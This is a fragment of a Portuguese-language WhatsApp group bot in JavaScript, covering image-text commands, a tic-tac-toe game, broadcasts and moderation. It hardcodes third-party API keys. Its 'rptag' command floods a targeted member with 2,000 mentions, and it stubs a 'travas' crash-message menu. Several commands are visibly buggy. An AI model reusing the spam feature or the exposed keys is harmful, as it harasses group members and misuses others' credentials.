if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/lithgtext?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'tai'})
break
case 'epep': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(6)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/epep?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'tai'})
break
case 'button': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(8)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/gplaybutton?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: buffer, caption: 'ta ai'})
break
case 'text3d': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(8)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break
case 'text3d': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(8)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/text3d?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break
case 'text3dbox': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(11)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break

//INICIO DO JOGO DA VELHA ❌ ⭕ 🔲
case 'ttthelp':
tomioka.sendMessage(from, ttthelp(prefix) , text, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "Jogo da velha", 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})					
break
case 'ttt':				
if (!isGroup) {
enviar(ptbr.group())
} else if (tttset.tttstatus == "on") {
enviar(`Alguém já está jogando no momento\nPor favor aguarde um instante...`)
} else if (tttset.waitingTime == "on") {
enviar(`Alguém jogou recentemente\nPor favor aguarde o tempo de espera...`)
} else if (args == 0 || (args != 'easy' && args != 'Easy' && args != 'EASY' && args != 'normal' && args != 'Normal' && args != 'NORMAL' && args != 'hard' && args != 'Hard' && args != 'HARD'&& args != 'impossible'&& args != 'Impossible' && args != 'IMPOSSIBLE')) {
enviar(`Defina a dificuldade\nEx.: ${prefix}ttt easy\n\nDificuldades: easy, normal, hard e impossible`)
} else {
tttset.tttstatus = "on"
tttset.player = sender
tttset.playerName = pushname
tttset.mentionPlayer = msg
tttset.local = from
if (args == 'easy' || args == 'Easy' || args == 'EASY') {
tttset.tttdifficulty = "EASY"
} else if (args == 'normal' || args == 'Normal' || args == 'NORMAL') {
tttset.tttdifficulty = "NORMAL"
} else if (args == 'hard' || args == 'Hard' || args == 'HARD') {
tttset.tttdifficulty = "HARD"
} else if (args == 'impossible' || args == 'Impossible' || args == 'IMPOSSIBLE') {
tttset.tttdifficulty = "IMPOSSIBLE"
}
const randomStartIA = Math.floor(Math.random() * 3)
if (randomStartIA == 0) {
IA()
tttset.reActivate1 = "on"	
}
enviar(`O jogo começou!!!\nModo: ${tttset.tttdifficulty} use ${prefix}ttthelp caso não saiba jogar`, text, crtt)
tomioka.sendMessage(from, `🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`,text )
tomioka.sendMessage(from,`Bom jogo`, text) 
setTimeout( () => {
tttset.waitingTime = "off"
tttset.autoEndTime = "on"
}, 120000) 
}
break	
case 'tttme':
if (!isGroup) return enviar (ptbr.group())
const checkTTTIdMe = getTTTId(sender)
if (checkTTTIdMe === undefined) addTTTId(sender)
tomioka.sendMessage(from, tttme(pushname, getTTTwins(sender), getTTTdefeats(sender), getTTTties(sender), getTTTpoints(sender)), text, {quoted:msg})
break	
case 'tttrank':
if (!isGroup) return enviar (ptbr.group())
//if (tictactoe.length < 3) return enviar (`Humm, é necessário que no mínimo 3 pessoas tenham jogado...`)
tictactoe.sort((a, b) => (a.points < b.points) ? 1 : -1)
mentioned_jid = []
let board = '【 TTT RANKS 】\n\n'
try {
for (let i = 0; i < 3; i++) {
if (i == 0) {board += `${i + 1}º 🥇 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n│ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n│ ➣ Empates: ${tictactoe[i].ties} 🌀\n│ ➣ Pontos: ${tictactoe[i].points} ✨\n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
} else if (i == 1) {board += `${i + 1}º 🥈 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n│ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n│ ➣ Empates: ${tictactoe[i].ties} 🌀\n│ ➣ Pontos: ${tictactoe[i].points} ✨\n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
} else if (i == 2) {board += `${i + 1}º 🥉 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ Vitórias: ${tictactoe[i].wins} 🎊\n│ ➣ Derrotas: ${tictactoe[i].defeats} 💥\n│ ➣ Empates: ${tictactoe[i].ties} 🌀\n│ ➣ Pontos: ${tictactoe[i].points} ✨\n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
}
mentioned_jid.push(tictactoe[i].jid)
} 
mentions(board, mentioned_jid, true)
} catch (err) {
console.log(err)
await tomioka.sendMessage(from, `Humm, é necessário que no mínimo 3 pessoas tenham jogado...`, text, {quoted: msg})
}
break	
case 'coord' :
tttset.playertest = sender
if (!isGroup) {
enviar(ptbr.group())
} else if (tttset.tttstatus == "off") {
enviar(`Você ainda não iniciou o jogo\nDigite ${prefix}ttt [DIFICULDADE] para iniciar`)
} else if (tttset.player != tttset.playertest) {
enviar(`Alguém já está jogando no momento\nPor favor aguarde um instante...`)
} else if (tttset.tttantibug == "on") {
enviar(`Aguarde a ação anterior ser concluída...`)
} else {
tttset.tttantibug = "on"
const coordX = args
if (coordX != 'a1' && coordX != 'a2' && coordX != 'a3' &&
coordX != 'b1' && coordX != 'b2' && coordX != 'b3' &&
coordX != 'c1' && coordX != 'c2' && coordX != 'c3') {
enviar(`Digite o comando com uma coordenada\nExemplo: ${prefix}coord a1`)
tttset.tttantibug = "off"
} else {
switch (args[0]) {
case 'a1':
if (esp.a1 != "🔲") {
enviar('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.a1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'a2':
if (esp.a2 != "🔲") {
enviar('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.a2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'a3':
if (esp.a3 != "🔲") {
enviar('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.a3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b1':
if (esp.b1 != "🔲") {
enviar('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.b1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b2':
if (esp.b2 != "🔲") {
enviar('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.b2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b3':
if (esp.b3 != "🔲") {
enviar('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.b3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c1':
if (esp.c1 != "🔲") {
enviar('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.c1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c2':
if (esp.c2 != "🔲") {
enviar('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.c2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c3':
if (esp.c3 != "🔲") {
enviar('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.c3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
}
tttset.reActivate1 = "on"
enviar(`🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`)
var randomTTTXP = 0
if (WinnerX()) {
if (isCmd) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = Math.floor(Math.random() * 25) + 25
addLevelingXp(tttset.player, randomTTTXP)
break
case "NORMAL":
randomTTTXP = Math.floor(Math.random() * 75) + 75
addLevelingXp(tttset.player, randomTTTXP)
break
case "HARD":
randomTTTXP = Math.floor(Math.random() * 200) + 200
addLevelingXp(tttset.player, randomTTTXP)
break
case "IMPOSSIBLE":
randomTTTXP = Math.floor(Math.random() * 1000) + 1000
addLevelingXp(tttset.player, randomTTTXP) 
break
}
tomioka.sendMessage(from, `🎉🎉 VITÓRIA DO JOGADOR 🎉🎉\n\n➣  RECOMPENSA: +${randomTTTXP} XP 🔮`, text)
} else {
tomioka.sendMessage(from, `🎉🎉 VITÓRIA DO JOGADOR 🎉🎉`, text)
}
const currentTTTwins = getTTTwins(tttset.player)
const checkTTTIdWin = getTTTId(tttset.player)
if (currentTTTwins === undefined && checkTTTIdWin === undefined) addTTTId(tttset.player)
addTTTwin(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (WinnerO()) {
if (isCmd) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = 0 - (Math.floor(Math.random() * 200) + 200)
addLevelingXp(tttset.player, randomTTTXP)
break
case "NORMAL":
randomTTTXP = 0 - (Math.floor(Math.random() * 75) + 75)
addLevelingXp(tttset.player, randomTTTXP)
break
case "HARD":
randomTTTXP = 0 - (Math.floor(Math.random() * 25) + 25)
addLevelingXp(tttset.player, randomTTTXP)
break
case "IMPOSSIBLE":
randomTTTXP = 0
addLevelingXp(tttset.player, randomTTTXP)
break
}	
tomioka.sendMessage(from, `🎉🎉 VITÓRIA DO 𝐁𝐎𝐓 🎉🎉\n\n➣  PUNIÇÃO: ${randomTTTXP} XP 🔮`, text)
} else {
tomioka.sendMessage(from, `🎉🎉 VITÓRIA DO 𝐁𝐎𝐓 🎉🎉`, text)
}
const currentTTTdefeats = getTTTdefeats(tttset.player)
const checkTTTIdDefeat = getTTTId(tttset.player)
if (currentTTTdefeats === undefined && checkTTTIdDefeat === undefined) addTTTId(tttset.player)
addTTTdefeat(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (Tie()) {
if (isCmd) {
tomioka.sendMessage(from, `🎉🎉 EMPATE 🎉🎉\n\n➣  NÃO HÁ GANHOS NEM PERDAS`, text)
} else {
tomioka.sendMessage(from, `🎉🎉 EMPATE 🎉🎉`, text)
}
const currentTTTties = getTTTties(tttset.player)
const checkTTTIdTie = getTTTId(tttset.player)
if (currentTTTties === undefined && checkTTTIdTie === undefined) addTTTId(tttset.player)
addTTTtie(tttset.player, 1)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
}
tttset.tttantibug = "off"
}
}
break
//_FIM DO JOGO DA VELHA By: Resen
/*case 'autostk':
if (!isGroup) return enviar(ptbr.group())
if (!isGroupAdmins) return enviar(ptbr.admin())
if (args.length < 1) return enviar(`Digite da forma correta:\nComando: ${prefix}autostk 1 para ativar `)
if (Number(args[0]) === 1) {
if (isAuto) return enviar('❎O recurso AUTO STICKER já está ativado no grupo❎')
atsticker.push(from)
fs.writeFileSync('./database/data/atisticker.json', JSON.stringify(_leveling))
enviar('✅O recurso AUTO STICKER foi ativado✅')
} else if (Number(args[0]) === 0) {
if (!isAuto) return enviar('❎O recurso AUTO STICKER não está ativado no grupo❎')
let position = false
Object.keys(atsticker).forEach((i) => {
if (atsticker[i] === from) {
position = i
}
})
if (position !== false) {
atsticker.splice(position, 1)
fs.writeFileSync('./database/data/atisticker.json', JSON.stringify(atsticker))
}
enviar('❌O recurso AUTO STICKER foi desativado❌')
} else {
enviar(`Digite da forma correta:\nComando: ${prefix}autostk 1, para ativar e 0 para desativar`)
}
break*/
case 'aviso':
if (!isOwner) return enviar ('Quem é você?')
if (args.length < 1) return enviar ('.......')
anu = await tomioka.chats.all()
if (isMedia && !msg.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
buff = await tomioka.downloadMediaMessage(encmedia)
for (let _ of anu) {
tomioka.sendMessage(_.jid, buff, image, {caption: `[ 𝐀𝐯𝐢𝐬𝐨 𝐓𝐎𝐌??𝐎𝐊𝐀 𝐁𝐎𝐓 ]\n\n${body.slice(4)}`})
}
enviar('Transmissao enviada')
} else {
for (let _ of anu) {
sendMess(_.jid, `[ 𝐀𝐯𝐢𝐬𝐨 𝐓𝐎𝐌𝐈𝐎𝐊𝐀 𝐁𝐎𝐓 ]\n\n${body.slice(7)}`)
}
enviar('Tm enviada com sucesso')
}
break
case 'tm':
if (!isOwner) return enviar ('Quem é você?')
if (args.length < 1) return enviar ('.......')
anu = await tomioka.chats.all()
if (isMedia && !msg.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg

for (let _ of anu) {
tomioka.sendMessage(_.jid, image, {caption: `[ 𝐓𝐫𝐚𝐧𝐬𝐦𝐢𝐬𝐬𝐚̃𝐨 𝐓𝐎𝐌𝐈𝐎𝐊𝐀 ]\n\n${body.slice(4)}`})
}
enviar('Transmissao enviada')
} else {
for (let _ of anu) {
sendMess(_.jid, `[ 𝐓𝐫𝐚𝐬𝐦𝐢𝐬𝐚̃𝐨 𝐓𝐎𝐌𝐈𝐎𝐊𝐀 ]\n\n${body.slice(4)}`)
}
enviar('Tm enviada com sucesso')
}
break
case 'usuarios':
tomioka.sendMessage(from,`total de usuários registrados no TOMIOKA BOT 🥰: ${user.length}`, text)
break
case 'cgame':

return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
buff = await getBuffer(`https://api.vhtear.com/gamelogo?text=${body.slice(7)}&apikey=${VthearApi}`, {method: 'get'})
tomioka.sendMessage(from, buff, image, {caption: 'Aqui amigo (a)', quoted: msg})

break 
case 'cparty':

part = `${body.slice(8)}`
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
bufferu = await getBuffer(`https://api.vhtear.com/partytext?text=${part}&apikey=${VthearApi}`, {method: 'get'})
tomioka.sendMessage(from, bufferu, image, {caption: 'Aqui amigo (a)', quoted: msg})

break 
case 'cstyle':

return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
buff = await getBuffer(`https://api.vhtear.com/stylelogo?text=${body.slice(8)}&apikey=${VthearApi}`, {method: 'get'})
tomioka.sendMessage(from, buff, image, {caption: 'Aqui amigo (a)', quoted: msg})

break 
case 'cglass':

glass = `${body.slice(8)}`
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
bufferu = await getBuffer(`https://api.vhtear.com/wetglass?text=${glass}&apikey=${VthearApi}`, {method: 'get'})
tomioka.sendMessage(from, bufferu, image, {caption: 'Aqui amigo (a)', quoted: msg})

break 
case 'croman':               
roman = `${body.slice(8)}`
if (args.length < 1) return enviar ('Cadê o texto, mano??')
if (args.length > 10) return enviar ('pelo menos 10 caracteres')
buff = await getBuffer(`https://api.vhtear.com/romancetext?text=${roman}&apikey=${VthearApi}`, {method: 'get'})
tomioka.sendMessage(from, buff, image, {quoted: msg})

break 
case 'setnomebot':
if (args.length < 1) return
if (!isOwner) return enviar (mess.only.ownerB)
name = body.slice(12)
enviar(`O nome do bot foi alterado com sucesso para : ${name}`)
break
case 'clove':
if (args.length < 1) return enviar ('Cadê o texto, mano??')
if (args.length > 10) return enviar ('pelo menos 10 caracteres')
love = `${body.slice(7)}`
buff = await getBuffer(`https://api.vhtear.com/lovemessagetext?text=${love}&apikey=${VthearApi}`, {method: 'get'})
tomioka.sendMessage(from, buff, image, {quoted: msg})

break
case 'smeme': case 'stickmeme':

top = arg.split('|')[0] 
bottom = arg.split('|')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg 
owgi = await  tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
sendStickerFromUrl(from, `${anu1}`)
} else {
enviar('Use fotos/adesivos!')
}
break
case 'travargp':
if (!isOwner) return enviar('só dono')
let tmporalc = tomioka.prepareMessageFromContent(from,{
"listMessage": {
"title": "MENU DE TRAVAS ",
"description": "Clique nos botões baixo e envie",
"buttonText": "clique aqui",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": 'TRAVAR1',
"rowId": ''
},
{
"title": 'TRAVAR2',
"rowId": ''
},
{
"title": 'TRAVAR3',
"rowId": ''
},
{
"title": 'TRAVAR4',
"rowId": ''
},
{
"title": 'TRAVAR5',
"rowId": ''
},
{
"title": 'TRAVAR6',
"rowId": ''
}
]
}
]                    
}
}, {quoted:tomioka})
tomioka.relayWAMessage(tmporalc)
break
case 'tomp3':
tomioka.updatePresence(from, Presence.composing) 
if (!isQuotedVideo) return enviar('Marque o video pfv')
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tomioka.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return enviar('❌ Falha ao converter vídeo para mp3 ❌')
buffer = fs.readFileSync(ran)
tomioka.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: msg})
fs.unlinkSync(ran)
})
break
case 'rptag':
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar("Marque a pessoa [@]")
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
teks = `*Marcação repetida*\n`
teks += "\n\n"
members_id = []
for (let z = 0; z < 2000; z++) {
teks += ` @${mentioned[0].split("@")[0]}`
members_id.push(mentioned[0])
}
mentions(teks, members_id, true)

break
case 'shorturl':
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/shorturl?url=${body.slice(10)}`)
hasil = `${anu.result}`
enviar(hasil)
break
case 'infonomor':
anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/infonomor?no=${body.slice(10)}`)
hasil = `*número* \n${anu.nomor} *internacional* \n${anu.international}`
enviar(hasil)
break
case 'igstalk':
if (args.length < 1) return enviar ('Masukan username mu!!')
ige = body.slice(9)
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`https://api.vhtear.com/igprofile?query=${ige}&apikey=ANTIGRATISNIHANJENKKK`, {method: 'get'})
buffer = await getBuffer(anu.result.picture)
capt = `User Ditemukan!!\n\n*➸ Nama :* ${anu.result.full_name}\n*➸ Username :* ${anu.result.username}\n*➸ Followers :* ${anu.result.follower}\n*➸ Mengikuti :* ${anu.result.follow}\n*➸ Jumlah Post :* ${anu.result.post_count}\n*➸ TOMIOKA :* ${anu.result.is_private}\n*➸ Bio :* ${anu.result.biography}`
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: capt})
break
case 'map':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
data = await fetchJson(`https://mnazria.herokuapp.com/api/maps?search=${body.slice(5)}`)
hasil = await getBuffer(data.gambar)
tomioka.sendMessage(from, hasil, image, {quoted: msg, caption: `Resultados de *${body.slice(5)}*`})

break
case 'users':
if (!isOwner) return enviar (mess.only.ownerB)    
teks = `\`\`\`╭────*「 *TOTAL DE USUÁRIOS TOMIOKA BOT 👑* 」\n\`\`\``
no = 0
for (let hehehe of user) {
no += 1
teks += `\`\`\`[${no.toString()}]\`\`\` @${hehehe.split('@')[0]}\n`
}
teks += `│+ Total de usuários : ${user.length}\n╰──────*「 *TOMIOKA* 」*────`
tomioka.sendMessage(from, teks.trim(), extendedText, {quoted: msg, contextInfo: {"mentionedJid": user}})
break
case 'limparchat':
case 'clearall':
case 'limpar':
case 'limpa':
if (!isOwner) return enviar ('só o cria pode')
anu = await tomioka.chats.all()
tomioka.setMaxListeners(25)
for (let _ of anu) {
tomioka.deleteChat(_.jid)
}
enviar(`[❗] CHATS LIMPO`)

break
case 'tempban':
if (!isOwner) return enviar ('só o cria pode')
if (args[1]=="segundos") {var timer = args[0]+"000"
} else if (args[1]=="minuto") {var timer = args[0]+"0000"
} else if (args[1]=="hora") {var timer = args[0]+"00000"
} else {return enviar("*selecionar:*\nsegundos\nminuto\nhora")}
if (msg.message.extendedTextMessage === null || msg.message.extendedTextMessage === undefined) return;
if (msg.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = msg.message.extendedTextMessage.contextInfo.mentionedJid
if (exe1.sayo> 1) {
var M_exe = []
for (let cut of exe1) {
M_exe.push(cut)
}
tomioka.groupRemove(from, M_exe)
} else {
tomioka.groupRemove(from, [exe1[0]])
}
} else {
exe1 = msg.message.extendedTextMessage.contextInfo.participant
tomioka.groupRemove(from, [exe1])
}
enviar(`[❗] tempo de ban : ${args[0]} ${args[1]}`)
setTimeout( () => {
exe1 = msg.message.extendedTextMessage.contextInfo.participant
tomioka.groupAdd(from, [exe1])			
}, timer)

break
case 'setppbot':
tomioka.updatePresence(from, Presence.composing) 
if (!isQuotedImage) return enviar (`Envie fotos com legendas ${prefix}setbotpp ou tags de imagem que já foram enviadas`)
if (!isOwner) return enviar (mess.only.ownerB)
enmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tomioka.downloadAndSaveMediaMessage(enmedia)
await tomioka.updateProfilePicture(botNumber, media)
enviar('Obrigado pelo novo perfil😗')
break
case 'happymod': 
///_Thiago02_
data = await fetchJson(`https://tobz-api.herokuapp.com/api/happymod?q=${body.slice(10)}&apikey=rm4zfzxZwjqaiEL4mu6x`)
hupo = data.result[0] 
teks = `*Nome*: ${data.result[0].title}\n*versao*: ${hupo.version}\n*tamanho:* ${hupo.size}\n*root*: ${hupo.root}\n*valor*: ${hupo.price}\n*link*: ${hupo.link}\n*download*: ${hupo.download}`
buffer = await getBuffer(hupo.image)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: `${teks}`})

break
case 'setnome':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
tomioka.groupUpdateSubject(from, `${body.slice(9)}`)
tomioka.sendMessage(from, 'Sucesso, alterou o nome do grupo', text, {quoted: msg})
break
case 'infogc':
tomioka.updatePresence(from, Presence.composing)
if (!isGroup) return enviar ('só grupo')
try {
ppimg = await tomioka.getProfilePicture(from)
} catch {
ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
}
let buf = await getBuffer(ppimg)
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += `*Nome do grupo :* ${groupName}\n*Descrição :* ${groupDesc}\n*Número de Administradores :* ${groupAdmins.length}\n*Número de membros :* ${groupMembers.length}`
no = 0
for (let admon of groupAdmins) {
no += 1
teks += `[${no.toString()}]`
}
tomioka.sendMessage(from, buf, image, {quoted: msg, caption: teks})
break
case 'block':

if (!isOwner) return enviar ("Apenas em grupo.")
tomioka.blockUser (`${body.slice(9)}@c.us`, "add")
tomioka.sendMessage(from, `BLOQUEADO`, text)
break
case 'unblock':
if (!isGroup) return enviar ('só grupo')
if (!isOwner) return enviar (mess.only.ownerB)
tomioka.blockUser (`${body.slice(9)}@c.us`, "remove")
tomioka.sendMessage(from, `Pedido recebido, desbloquear ${body.slice(9)}@c.us`, text)
break
case 'bloqueados':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isPremium) return enviar ('só premium')
teks = 'Esta é a lista de números bloqueados :\n'
for (let block of blocked) {
teks += `~> @${block.split('@')[0]}\n`
}
teks += `Total : ${blocked.length}`
tomioka.sendMessage(from, teks.trim(), extendedText, {quoted: msg, contextInfo: {"mentionedJid": blocked}})
break
case 'ler':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
.then(teks => {
enviar(teks.trim())
fs.unlinkSync(media)
})
.catch(err => {
enviar(err.message)
fs.unlinkSync(media)
})
} else {
enviar('Só uma foto mano')
}
break


/*case 'wafig':

if (!isGroup)return tomioka.sendMessage(from, `[ ! ]  ᴄᴏᴍᴀɴᴅᴏ ᴅɪsᴘᴏɴɪʙʟᴇ sᴏʟᴏ ᴘᴀʀᴀ ʟᴏs ɢʀᴜᴘᴏs....`, MessageType.text, {quoted: msg, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
if (isMedia && !msg.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
enviar('erro')
})
.on('end', async function () {
console.log('Finish')
const webpWithMetadata = await WSF.createSticker('PAQUETE', 'AUTOR', `./sticker/${sender}.webp`)
tomioka.sendMessage(from, webpWithMetadata, MessageType.sticker, {quoted: msg, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
fs.unlinkSync(media)  
fs.unlinkSync(`./sticker/${sender}.webp`)  
})
